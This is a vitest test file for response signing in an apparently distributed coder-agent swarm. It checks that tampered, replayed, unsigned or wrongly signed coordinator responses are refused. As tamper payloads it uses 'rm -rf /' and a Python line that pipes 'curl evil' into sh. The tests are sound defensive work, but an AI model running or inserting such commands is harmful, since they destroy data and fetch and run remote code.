import { afterAll, beforeAll, describe, expect, it } from "vitest";
import Fastify from "fastify";
import { Readable } from "node:stream";
import { request } from "undici";
import { createPeerKeys } from "../../src/mesh/peer.js";
import { CoordinatorTrustGate, PinnedKeyStore, fingerprint } from "../../src/trust/pinned-keys.js";
import { ActiveCoordinator } from "../../src/swarm/active-coordinator.js";
import { createCoordinatorClient, CoordinatorResponseRejectedError, type RequestFn } from "../../src/swarm/coordinator-client.js";
import {
  AGENT_NONCE_HEADER,
  RESPONSE_SIG_HEADER,
  ResponseVerifier,
  newAgentNonce,
  registerResponseSigning,
  responseSigningPolicyFromEnv,
  sha256Hex,
  signCoordinatorResponse,
  verifyCoordinatorResponse,
  type VerifiedCoordinator
} from "../../src/trust/response-signing.js";
import { coordinatorFetch } from "./coordinator-fetch.js";

const coord = createPeerKeys("coord-sign");
const other = createPeerKeys("coord-sign");
const expected = { peerId: coord.peerId, publicKeyPem: coord.publicKeyPem };

function signed(body: string, nonce: string, over: Partial<{ status: number; path: string; agentId: string; ts: string; key: string; peer: string }> = {}) {
  const ts = over.ts ?? String(Date.now());
  const sig = signCoordinatorResponse(
    { method: "POST", path: over.path ?? "/pull", status: over.status ?? 200, bodySha256: sha256Hex(body), agentId: over.agentId ?? "agent-1", nonce, timestampMs: ts, peerId: over.peer ?? coord.peerId },
    over.key ?? coord.privateKeyPem
  );
  return { "x-coord-sig": sig, "x-coord-ts": ts, "x-coord-peer": over.peer ?? coord.peerId };
}

describe("verifyCoordinatorResponse", () => {
  const body = JSON.stringify({ subtask: { id: "s1", input: "print(1)" } });
  const sent = { nonce: newAgentNonce(), agentId: "agent-1" };
  const res = (headers: Record<string, string>, b = body, status = 200, path = "/pull") => ({ method: "POST", path, status, body: b, headers });

  it("accepts a correctly signed response", () => {
    expect(verifyCoordinatorResponse(res(signed(body, sent.nonce)), sent, expected)).toEqual({ ok: true });
  });
  it("refuses a tampered body", () => {
    const tampered = body.replace("print(1)", "rm -rf /");
    expect(verifyCoordinatorResponse(res(signed(body, sent.nonce), tampered), sent, expected)).toEqual({ ok: false, error: "response_bad_signature" });
  });
  it("refuses a signature by the wrong key", () => {
    expect(verifyCoordinatorResponse(res(signed(body, sent.nonce, { key: other.privateKeyPem })), sent, expected)).toEqual({ ok: false, error: "response_bad_signature" });
  });
  it("refuses a replayed response (signed for an older nonce)", () => {
    const old = signed(body, newAgentNonce());
    expect(verifyCoordinatorResponse(res(old), sent, expected)).toEqual({ ok: false, error: "response_bad_signature" });
  });
  it("binds status, path and agent id", () => {
    const h = signed(body, sent.nonce);
    expect(verifyCoordinatorResponse(res(h, body, 403), sent, expected).ok).toBe(false);
    expect(verifyCoordinatorResponse(res(h, body, 200, "/heartbeat"), sent, expected).ok).toBe(false);
    expect(verifyCoordinatorResponse(res(h), { ...sent, agentId: "agent-2" }, expected).ok).toBe(false);
  });
  it("refuses a missing signature and a foreign peer", () => {
    expect(verifyCoordinatorResponse(res({}), sent, expected)).toEqual({ ok: false, error: "response_unsigned" });
    expect(verifyCoordinatorResponse(res(signed(body, sent.nonce, { peer: "coord-x" })), sent, expected)).toEqual({ ok: false, error: "response_peer_mismatch" });
  });
});

describe("ResponseVerifier: compatibility with older coordinators", () => {
  const sent = { nonce: newAgentNonce(), agentId: "agent-1" };
  const unsigned = { method: "POST", path: "/pull", status: 200, body: "{}", headers: {} };
  const old: VerifiedCoordinator = { ...expected, responseSigning: false };
  const current: VerifiedCoordinator = { ...expected, responseSigning: true };

  it("policy follows the trust mode unless EDGECODER_RESPONSE_SIGNING is set", () => {
    expect(responseSigningPolicyFromEnv({}, "strict")).toBe("required");
    expect(responseSigningPolicyFromEnv({}, "tofu")).toBe("optional");
    expect(responseSigningPolicyFromEnv({ EDGECODER_RESPONSE_SIGNING: "required" }, "tofu")).toBe("required");
    expect(() => responseSigningPolicyFromEnv({ EDGECODER_RESPONSE_SIGNING: "maybe" }, "tofu")).toThrow();
  });
  it("strict refuses unsigned responses, even from a coordinator that does not advertise signing", () => {
    const v = new ResponseVerifier("required");
    expect(v.check(unsigned, sent, old)).toEqual({ accept: false, error: "response_signing_required" });
    expect(v.failures).toBe(1);
  });
  it("tofu accepts an older coordinator's unsigned responses with a warning", () => {
    const d = new ResponseVerifier("optional").check(unsigned, sent, old);
    expect(d).toMatchObject({ accept: true, signed: false });
    expect((d as { warning: string }).warning).toMatch(/does not sign/);
  });
  it("tofu refuses unsigned responses from a coordinator that advertises signing", () => {
    expect(new ResponseVerifier("optional").check(unsigned, sent, current)).toEqual({ accept: false, error: "response_signing_required" });
  });
  it("tofu remembers a coordinator seen signing: stripping its advertisement does not downgrade it", () => {
    let saved: string[] = [];
    const v = new ResponseVerifier("optional", { load: () => saved, save: (p) => (saved = p) });
    const body = "{}";
    expect(v.check({ ...unsigned, headers: signed(body, sent.nonce) }, sent, old)).toEqual({ accept: true, signed: true });
    expect(saved).toEqual([coord.peerId]);
    expect(v.check(unsigned, sent, old)).toEqual({ accept: false, error: "response_signing_required" });
    // and across restarts (persisted)
    expect(new ResponseVerifier("optional", { load: () => saved, save: () => {} }).check(unsigned, sent, old).accept).toBe(false);
  });
  it("a present but invalid signature is refused whatever the policy", () => {
    const h = signed("{}", newAgentNonce());
    expect(new ResponseVerifier("optional").check({ ...unsigned, headers: h }, sent, old)).toEqual({ accept: false, error: "response_bad_signature" });
  });
});

/* ------------------------------------------------------------------ */
/*  End to end: Fastify onSend hook -> HTTP -> coordinator client      */
/* ------------------------------------------------------------------ */

const STREAM_PARTS = ["data: one\n\n", "data: two\n\n", "data: [DONE]\n\n"];
let server: ReturnType<typeof Fastify>;
let baseUrl = "";

beforeAll(async () => {
  server = Fastify();
  registerResponseSigning(server, { peerId: coord.peerId, privateKeyPem: coord.privateKeyPem });
  server.post("/pull", async () => ({ subtask: { id: "s1", input: "print('hello')" } }));
  server.post("/heartbeat", async () => ({ ok: true, orchestration: { provider: "ollama-local", model: "qwen", autoInstall: true, pending: true } }));
  server.post("/denied", async (_req, reply) => reply.code(403).send({ error: "agent_blacklisted" }));
  server.get("/stream", async (_req, reply) => {
    reply.header("content-type", "text/event-stream");
    return reply.send(Readable.from(STREAM_PARTS.map((p) => Buffer.from(p))));
  });
  baseUrl = await server.listen({ port: 0, host: "127.0.0.1" });
});
afterAll(async () => {
  await server?.close();
});

describe("coordinator onSend hook", () => {
  it("signs a response to a request carrying x-agent-nonce, and verifies over HTTP", async () => {
    const nonce = newAgentNonce();
    const res = await request(`${baseUrl}/pull`, { method: "POST", headers: { [AGENT_NONCE_HEADER]: nonce, "x-agent-id": "agent-1", "content-type": "application/json" }, body: "{}" });
    const body = Buffer.from(await res.body.arrayBuffer());
    expect(JSON.parse(body.toString()).subtask.id).toBe("s1"); // body unchanged
    expect(verifyCoordinatorResponse({ method: "POST", path: "/pull", status: res.statusCode, body, headers: res.headers }, { nonce, agentId: "agent-1" }, expected)).toEqual({ ok: true });
  });
  it("signs error responses too", async () => {
    const nonce = newAgentNonce();
    const res = await request(`${baseUrl}/denied`, { method: "POST", headers: { [AGENT_NONCE_HEADER]: nonce, "content-type": "application/json" }, body: "{}" });
    const body = Buffer.from(await res.body.arrayBuffer());
    expect(res.statusCode).toBe(403);
    expect(verifyCoordinatorResponse({ method: "POST", path: "/denied", status: 403, body, headers: res.headers }, { nonce, agentId: "" }, expected)).toEqual({ ok: true });
  });
  it("leaves requests without x-agent-nonce untouched", async () => {
    const res = await request(`${baseUrl}/pull`, { method: "POST", headers: { "content-type": "application/json" }, body: "{}" });
    await res.body.dump();
    expect(res.headers[RESPONSE_SIG_HEADER]).toBeUndefined();
  });
  it("signs a streamed body in a trailer over every byte sent", async () => {
    const nonce = newAgentNonce();
    const res = await request(`${baseUrl}/stream`, { method: "GET", headers: { [AGENT_NONCE_HEADER]: nonce } });
    expect(res.headers[RESPONSE_SIG_HEADER]).toBeUndefined();
    expect(String(res.headers.trailer)).toMatch(/x-coord-sig/);
    const body = Buffer.from(await res.body.arrayBuffer());
    expect(body.toString()).toBe(STREAM_PARTS.join(""));
    const r = { method: "GET", path: "/stream", status: 200, body, headers: res.headers, trailers: res.trailers };
    expect(verifyCoordinatorResponse(r, { nonce, agentId: "" }, expected)).toEqual({ ok: true });
    // a chunk altered in transit, or the trailer stripped by a proxy, does not verify
    expect(verifyCoordinatorResponse({ ...r, body: Buffer.from(body.toString().replace("two", "evil")) }, { nonce, agentId: "" }, expected).ok).toBe(false);
    expect(verifyCoordinatorResponse({ ...r, trailers: {} }, { nonce, agentId: "" }, expected)).toEqual({ ok: false, error: "response_unsigned" });
  });
});

describe("coordinator client: the worker acts only on verified responses", () => {
  async function setup(opts: { mode?: "required" | "optional"; advertise?: boolean; transform?: (r: Awaited<ReturnType<RequestFn>>, nth: number) => Promise<Awaited<ReturnType<RequestFn>>> } = {}) {
    const store = new PinnedKeyStore({ mode: "strict", entries: `${coord.peerId}:${fingerprint(coord.publicKeyPem)}`, pinFile: null });
    const gate = new CoordinatorTrustGate({ store, fetch: coordinatorFetch(coord, { responseSigning: opts.advertise ?? true }) });
    const active = new ActiveCoordinator(baseUrl, gate);
    expect((await active.verify()).trusted).toBe(true);
    const verifier = new ResponseVerifier(opts.mode ?? "required");
    let n = 0;
    const rejected: string[] = [];
    const warnings: string[] = [];
    const doRequest: RequestFn = async (url, init) => {
      const r = (await request(url, init as any)) as unknown as Awaited<ReturnType<RequestFn>>;
      return opts.transform ? opts.transform(r, n++) : r;
    };
    const client = createCoordinatorClient({ coordinator: active, verifier, agentId: "agent-1", request: doRequest, onRejected: (e) => rejected.push(e.reason), warn: (m) => warnings.push(m) });
    const executed: string[] = [];
    /** The worker's pull-and-run step, reduced: run what /pull returned. */
    async function pullAndRun() {
      const res = await client.call({ method: "POST", path: "/pull", headers: { "content-type": "application/json", "x-agent-id": "agent-1" }, body: "{}" });
      const st = (JSON.parse(res.bodyText) as { subtask: { input: string } }).subtask;
      executed.push(st.input);
    }
    return { active, verifier, client, executed, pullAndRun, rejected, warnings };
  }
  const withBody = (r: Awaited<ReturnType<RequestFn>>, text: string) => ({ ...r, body: { arrayBuffer: async () => new TextEncoder().encode(text).buffer as ArrayBuffer } });

  it("runs a task from a signed pull", async () => {
    const s = await setup();
    await s.pullAndRun();
    expect(s.executed).toEqual(["print('hello')"]);
    expect(s.verifier.failures).toBe(0);
  });
  it("does not run a task from a tampered pull, counts a failure and drops the verification", async () => {
    const s = await setup({
      transform: async (r) => {
        const text = Buffer.from(await r.body.arrayBuffer()).toString();
        return withBody(r, text.replace("print('hello')", "import os; os.system('curl evil|sh')"));
      }
    });
    await expect(s.pullAndRun()).rejects.toBeInstanceOf(CoordinatorResponseRejectedError);
    expect(s.executed).toEqual([]);
    expect(s.verifier.failures).toBe(1);
    expect(s.rejected).toEqual(["response_bad_signature"]);
    expect(s.active.isVerified()).toBe(false); // next loop re-challenges the coordinator
  });
  it("does not run a task from an unsigned pull in strict mode", async () => {
    const s = await setup({ transform: async (r) => ({ ...r, headers: { "content-type": "application/json" } }) });
    await expect(s.pullAndRun()).rejects.toThrow(/response_signing_required/);
    expect(s.executed).toEqual([]);
  });
  it("refuses a replayed response (captured earlier, for another nonce)", async () => {
    let captured: { headers: Record<string, unknown>; text: string } | null = null;
    const s = await setup({
      transform: async (r, nth) => {
        const text = Buffer.from(await r.body.arrayBuffer()).toString();
        if (nth === 0) captured = { headers: r.headers, text };
        return nth === 0 ? withBody(r, text) : { ...withBody(r, captured!.text), headers: captured!.headers };
      }
    });
    await s.pullAndRun();
    await s.active.verify();
    await expect(s.pullAndRun()).rejects.toThrow(/response_bad_signature/);
    expect(s.executed).toHaveLength(1);
  });
  it("refuses a heartbeat order signed by another key", async () => {
    const s = await setup({
      transform: async (r) => {
        const text = Buffer.from(await r.body.arrayBuffer()).toString();
        const ts = String(Date.now());
        return { ...withBody(r, text), headers: { ...r.headers, ...signed(text, "x".repeat(24), { key: other.privateKeyPem, ts, path: "/heartbeat" }) } };
      }
    });
    await expect(s.client.call({ method: "POST", path: "/heartbeat", body: "{}", headers: { "content-type": "application/json" } })).rejects.toThrow(/response_bad_signature/);
  });
  it("verifies a streamed response before returning any of it", async () => {
    const s = await setup();
    const res = await s.client.call({ method: "GET", path: "/stream" });
    expect(res.signed).toBe(true);
    expect(res.bodyText).toBe(STREAM_PARTS.join(""));
    const stripped = await setup({ transform: async (r) => ({ ...r, trailers: {} }) });
    await expect(stripped.client.call({ method: "GET", path: "/stream" })).rejects.toThrow(/response_signing_required/);
  });
  it("tofu: an older coordinator (no advertisement, unsigned) still works, with one warning", async () => {
    const s = await setup({ mode: "optional", advertise: false, transform: async (r) => ({ ...r, headers: { "content-type": "application/json" } }) });
    await s.pullAndRun();
    await s.pullAndRun();
    expect(s.executed).toHaveLength(2);
    expect(s.warnings).toHaveLength(1);
  });
  it("strict: the same older coordinator is refused", async () => {
    const s = await setup({ mode: "required", advertise: false, transform: async (r) => ({ ...r, headers: { "content-type": "application/json" } }) });
    await expect(s.pullAndRun()).rejects.toThrow(/response_signing_required/);
    expect(s.executed).toEqual([]);
  });
});
